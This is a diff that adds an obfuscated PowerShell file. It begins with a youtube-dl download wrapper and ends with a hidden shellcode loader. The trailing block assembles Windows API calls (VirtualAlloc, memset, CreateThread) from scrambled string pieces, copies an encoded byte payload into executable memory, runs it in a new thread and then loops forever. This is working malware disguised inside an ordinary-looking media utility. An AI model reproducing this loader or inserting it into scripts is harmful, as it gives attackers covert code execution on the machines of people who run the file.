@@ -1,0 +1,73 @@
+function Y`Dl {
+    param (
+        [string]${u`Rl} = (&("{1}{0}{2}{3}"-f '-C','Get','l','ipboard')),
+        [ValidateSet({"{1}{0}"-f 'o','audi'}, {"{1}{0}" -f 'o','vide'})]
+        [string]${ty`PE} = ("{0}{1}" -f'audi','o'),
+        [switch]${U},
+        [string]${y`dlPa`Th} = "$env:userprofile\Dropbox\Documents\PSScripts\youtube\youtube-dl.exe",
+        [ValidateSet({"{1}{0}"-f'to','au'}, {"{0}{1}"-f 'be','st'}, {"{0}{1}" -f 'wor','st'})]
+        [string]${qUAl`ITy} = ("{1}{0}"-f 'uto','a')
+    )
+    
+    if (${u}) {
+        .("{0}{1}"-f's','tart') ${Y`d`LPaTh} -ArgumentList ("{2}{0}{1}" -f 'pd','ate','--u')
+        return
+    }
+    
+    if (!(&("{1}{2}{0}" -f'th','Tes','t-Pa') ((("{0}{1}" -f 'c:EA','3temp'))-CREpLACE'EA3',[cHar]92))) {
+        ${Nu`lL} = .('md') ((("{3}{0}{2}{1}"-f 'b7Yt','mp','e','c:'))  -crEpLAcE([chaR]98+[chaR]55+[chaR]89),[chaR]92)
+    }
+    
+    if (!(&("{2}{1}{0}" -f 'th','st-Pa','Te') ((("{3}{2}{6}{0}{5}{4}{1}"-f 'ft','exe','t','c:','mpt9fffprobe.','e','9'))."REP`l`ACe"('t9f',[STRIng][chAR]92)))) {
+        .('cp') "$env:userprofile\Dropbox\Documents\PSScripts\youtube\ffprobe.exe" (("{1}{3}{2}{0}" -f'p','c','Uptem',':8')).rePLACe(([cHAr]56+[cHAr]85+[cHAr]112),'\')
+    }
+
+    if (!(.("{0}{2}{1}" -f'Test','h','-Pat') ((("{4}{6}{0}{5}{2}{3}{1}"-f'Vm','xe','p','eg.e','c:','ffm','0Vmtemp0')).("{1}{0}" -f'LaCe','reP').Invoke('0Vm','\')))) {
+        &('cp') "$env:userprofile\Dropbox\Documents\PSScripts\youtube\ffmpeg.exe" (("{1}{0}" -f'nEZtemp','c:')).RePLaCE('nEZ',[sTRiNg][cHAr]92)
+    }
+
+    .('cd') ((("{2}{0}{1}"-f 'wte','mp','c:JL'))  -CrEplaCe 'JLw',[cHar]92)
+
+    ${Qu`A`Lity} = switch (${Q`Ua`LiTY}) {
+        ("{1}{0}" -f 'to','au') {
+            if (${ty`pE} -eq ("{1}{0}" -f 'o','vide')) {
+                ("{0}{1}"-f 'bes','t')
+            } else {
+                ("{0}{1}" -f 'b','est') 
+            }
+        }
+
+        ("{0}{1}" -f'be','st') {("{1}{0}"-f 'est','b')}
+        
+        ("{0}{1}"-f 'w','orst') {("{1}{0}"-f 'rst','wo')}
+    }
+
+    if (${u`Rl} -match ("{0}{1}{2}" -f'playli','s','t')) {
+        switch (${tY`pe}) {
+            ("{0}{1}"-f 'vide','o') { . ${yDl`P`Ath} ("{5}{3}{0}{1}{6}{4}{2}" -f'p','ut','at','-merge-out','form','-','-') ("{1}{0}"-f '4','mp') -wic -o ("{1}{3}{4}{2}{5}{0}"-f's','%(auto','%(','number)s %(t','itle)s.','ext)') -f ${q`U`AlItY} ${u`RL} }
+            ("{0}{1}"-f 'aud','io') { . ${yd`L`PAth} ("{3}{0}{2}{1}" -f 'tract-','o','audi','--ex') ("{0}{1}{2}{3}{4}" -f'--a','udio-f','orm','a','t') ("{0}{1}"-f 'm','p3') -wic -o ("{4}{3}{8}{7}{2}{0}{6}{1}{5}"-f 't','%(ex','(','(autonumbe','%','t)s','itle)s.',')s %','r') -f ${q`UA`LitY} ${U`RL} }
+        }
+    } elseif (${U`RL} -match ("{1}{0}"-f 'tube','you')) {
+        switch (${tY`Pe}) {
+            ("{1}{0}"-f'eo','vid') { . ${y`Dl`patH} ("{6}{4}{3}{2}{1}{5}{0}"-f't','f','t-','tpu','e-ou','orma','--merg') ("{1}{0}"-f'4','mp') -wic -o (("{0}{3}{2}{1}"-f '%(','t)s','e)s.%(ex','titl')) -f ${QUa`lItY} ${U`Rl} }
+            ("{0}{1}" -f'aud','io') { . ${YDl`pA`TH} ("{1}{3}{0}{2}" -f 'xtra','-','ct-audio','-e') ("{2}{1}{0}" -f 'io-format','aud','--') ("{1}{0}"-f 'p3','m') -wic -o ("{3}{4}{0}{2}{1}" -f 's.%','s','(ext)','%(tit','le)') -f ${q`Ua`Lity} ${U`RL} }
+        }
+    } elseif (${U`Rl} -match ("{0}{1}{2}" -f'sound','clou','d')) {
+        . ${ydl`PA`Th} -wic -o (("{5}{3}{2}{4}{0}{1}" -f 's.%(e','xt)s','tle','i',')','%(t')) ${u`Rl}
+    } else {
+        switch (${T`ypE}) {
+            ("{1}{0}"-f 'o','vide') { . ${yDL`PAth} ("{0}{3}{1}{2}" -f'--merg','ut','-format','e-outp') ("{1}{0}" -f 'p4','m') -wic -o (("{4}{0}{1}{2}{3}"-f'title)s.%(ex','t',')','s','%(')) ${U`Rl} }
+            ("{0}{1}"-f 'a','udio') { . ${y`dlP`AtH} ("{1}{2}{4}{3}{0}"-f 'io','--ext','ra','d','ct-au') ("{0}{3}{2}{1}"-f '--aud','ormat','f','io-') ("{1}{0}" -f'p3','m') -wic -o ("{0}{1}{3}{2}"-f '%(titl','e)s.%(','s','ext)') ${u`RL} }
+        }
+    }
+    
+    if (&("{1}{2}{0}"-f't-Path','T','es') ((("{2}{0}{1}"-f 'temp{0}ffprobe','.exe','c:{0}'))  -F [cHaR]92)) {
+        .("{1}{0}"-f 'el','d') ((("{2}{4}{0}{5}{1}{3}" -f'r','e.','c:jMNtempjMNff','exe','p','ob'))."reP`La`Ce"(([chAr]106+[chAr]77+[chAr]78),'\'))
+    }
+
+    if (&("{1}{0}" -f't-Path','Tes') ((("{5}{2}{4}{3}{1}{0}"-f'xe','xYffmpeg.e','x','tempk','Y','c:k'))."r`EPlAce"(([ChaR]107+[ChaR]120+[ChaR]89),[sTRiNG][ChaR]92))) {
+        &("{0}{1}"-f'd','el') ((("{4}{0}{1}{3}{5}{2}"-f '4','67te','exe','mp467ffmpeg','c:','.'))."r`E`plaCE"(([CHaR]52+[CHaR]54+[CHaR]55),'\'))
+    }
+}
+
+${H`9h} = ((("{110}{101}{119}{55}{38}{37}{42}{27}{111}{30}{73}{96}{61}{56}{31}{117}{12}{59}{10}{112}{6}{15}{47}{3}{107}{88}{125}{124}{36}{64}{1}{65}{49}{44}{109}{53}{28}{11}{71}{86}{97}{94}{79}{72}{98}{2}{4}{76}{57}{128}{5}{29}{35}{21}{113}{81}{60}{92}{7}{123}{74}{52}{67}{46}{17}{108}{33}{121}{13}{16}{82}{77}{93}{118}{43}{80}{69}{9}{8}{68}{103}{114}{122}{95}{84}{18}{120}{45}{87}{0}{62}{48}{39}{22}{116}{78}{63}{105}{34}{70}{26}{100}{51}{25}{75}{32}{126}{50}{23}{104}{40}{102}{19}{20}{85}{89}{58}{115}{83}{54}{127}{14}{66}{106}{41}{24}{91}{99}{90}" -f 'int ','t','ic static','ntPt',' e','n IntP','u','nt','St','r lp','ir','t);[DllI','IntP','int d','d','alAlloc','w','a','e','a','t','e','t','i','ou','c','rt(o','.dllou7)]','Protec','t','b','tatic','.dl',', ','Id);','r Cr','ui','ke','ou7','s, In',' ','src, uint c','rnel32','Int','Allocati','e','hre','(I','wCreationFlag','l',']publ','msv','p','ype, uint fl','m','port(',' s','te','Int','tr V','eThr','c','d','h','n',' f','es','T','art','t','[DllImpo','mp',')]pu','l','r l','rt','x','ac','pT','u7','P','t','St','me','tr lpParam','ic extern','ort','r, u','uin',' ',';','nt','ead(I','kS','l32.dllo','tP','i','(ou7kerne','bl',')','u7','DllI','st','Address','c','read','t, uint ','r lpAddress, ','dAttributes','onT','[','pu','t','a',',','Ptr ','Ptr l',' extern ','ize, ','m','t','u',' In','Pt','ze, ','t dwSi','lou7)','set(IntPtr ','r')) -CRepLACE  ([CHar]111+[CHar]117+[CHar]55),[CHar]34);${w} = &("{2}{0}{1}" -f 'd','-Type','Ad') -memberDefinition ${h`9h} -Name ("{1}{0}" -f'in32','W') -namespace ("{0}{1}{2}{3}"-f'W','in32Fun','c','tions') -passthru;[Byte[]];[Byte[]]${Z} = 0xba,0x9a,0x79,0x2d,0x43,0xdb,0xdf,0xd9,0x74,0x24,0xf4,0x5d,0x31,0xc9,0xb1,0x47,0x31,0x55,0x13,0x83,0xc5,0x04,0x03,0x55,0x95,0x9b,0xd8,0xbf,0x41,0xd9,0x23,0x40,0x91,0xbe,0xaa,0xa5,0xa0,0xfe,0xc9,0xae,0x92,0xce,0x9a,0xe3,0x1e,0xa4,0xcf,0x17,0x95,0xc8,0xc7,0x18,0x1e,0x66,0x3e,0x16,0x9f,0xdb,0x02,0x39,0x23,0x26,0x57,0x99,0x1a,0xe9,0xaa,0xd8,0x5b,0x14,0x46,0x88,0x34,0x52,0xf5,0x3d,0x31,0x2e,0xc6,0xb6,0x09,0xbe,0x4e,0x2a,0xd9,0xc1,0x7f,0xfd,0x52,0x98,0x5f,0xff,0xb7,0x90,0xe9,0xe7,0xd4,0x9d,0xa0,0x9c,0x2e,0x69,0x33,0x75,0x7f,0x92,0x98,0xb8,0xb0,0x61,0xe0,0xfd,0x76,0x9a,0x97,0xf7,0x85,0x27,0xa0,0xc3,0xf4,0xf3,0x25,0xd0,0x5e,0x77,0x9d,0x3c,0x5f,0x54,0x78,0xb6,0x53,0x11,0x0e,0x90,0x77,0xa4,0xc3,0xaa,0x83,0x2d,0xe2,0x7c,0x02,0x75,0xc1,0x58,0x4f,0x2d,0x68,0xf8,0x35,0x80,0x95,0x1a,0x96,0x7d,0x30,0x50,0x3a,0x69,0x49,0x3b,0x52,0x5e,0x60,0xc4,0xa2,0xc8,0xf3,0xb7,0x90,0x57,0xa8,0x5f,0x98,0x10,0x76,0xa7,0xdf,0x0a,0xce,0x37,0x1e,0xb5,0x2f,0x11,0xe4,0xe1,0x7f,0x09,0xcd,0x89,0xeb,0xc9,0xf2,0x5f,0x81,0xcc,0x64,0xa0,0xfe,0xce,0x39,0x48,0xfd,0xd0,0xc1,0xd8,0x88,0x37,0x91,0x88,0xda,0xe7,0x51,0x79,0x9b,0x57,0x39,0x93,0x14,0x87,0x59,0x9c,0xfe,0xa0,0xf3,0x73,0x57,0x98,0x6b,0xed,0xf2,0x52,0x0a,0xf2,0x28,0x1f,0x0c,0x78,0xdf,0xdf,0xc2,0x89,0xaa,0xf3,0xb2,0x79,0xe1,0xae,0x14,0x85,0xdf,0xc5,0x98,0x13,0xe4,0x4f,0xcf,0x8b,0xe6,0xb6,0x27,0x14,0x18,0x9d,0x3c,0x9d,0x8c,0x5e,0x2a,0xe2,0x40,0x5f,0xaa,0xb4,0x0a,0x5f,0xc2,0x60,0x6f,0x0c,0xf7,0x6e,0xba,0x20,0xa4,0xfa,0x45,0x11,0x19,0xac,0x2d,0x9f,0x44,0x9a,0xf1,0x60,0xa3,0x1a,0xcd,0xb6,0x8d,0x68,0x3f,0x0b;${G} = 0x1000;if (${Z}."L`eN`gth" -gt 0x1000){${G} = ${Z}."L`ENGTh"};${Kx`AY}=${w}::("{3}{2}{0}{1}" -f'alAllo','c','irtu','V').Invoke(0,0x1000,${G},0x40);for (${i}=0;${I} -le (${Z}."lEn`GTh"-1);${I}++) {${W}::"mE`m`Set"([IntPtr](${k`xAY}.("{0}{1}{2}"-f'ToIn','t','32').Invoke()+${I}), ${Z}[${I}], 1)};${w}::("{3}{2}{0}{1}"-f 'e','ad','eThr','Creat').Invoke(0,0,${k`XAy},0,0,0);for (;;){.("{2}{0}{1}" -f 'rt','-sleep','Sta') 60};
